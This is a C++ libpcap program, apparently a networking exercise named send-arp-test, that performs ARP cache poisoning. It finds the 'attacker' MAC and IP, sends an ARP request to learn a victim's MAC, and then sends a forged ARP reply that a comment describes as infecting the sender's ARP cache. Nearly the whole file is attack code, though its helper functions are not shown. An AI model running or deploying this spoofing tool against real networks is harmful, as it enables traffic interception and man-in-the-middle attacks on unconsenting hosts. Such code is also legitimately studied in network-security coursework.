#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "find_attacker_mac.h"
#include "find_attacker_ip.h"
#include "my_arp.h"

#pragma pack(push, 1)
struct EthArpPacket
{
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage()
{
	printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) 
{
	if (argc != 4) 
	{
		usage();
		return -1;
	}
	int i = 0;
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) 
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	char attacker_mac[20];
	char sender_mac[20];
	char attacker_ip[40];

	// find attacker's mac address
	find_mac(attacker_mac, argv);
	// print attacker's mac address
	printf("My(Attacker) MAC : %s\n", attacker_mac);
	find_ip(attacker_ip, argv);
	printf("My(Attacker) IP : %s\n", attacker_ip);

	// Generate ARP Request for get Sender MAC address
	arp_request(attacker_ip, attacker_mac, sender_mac, argv, handle);

	// Generate ARP Reply for infection Sender ARP cache
	arp_reply(attacker_ip, attacker_mac, sender_mac, argv, handle);

	pcap_close(handle);

	return 0;
}
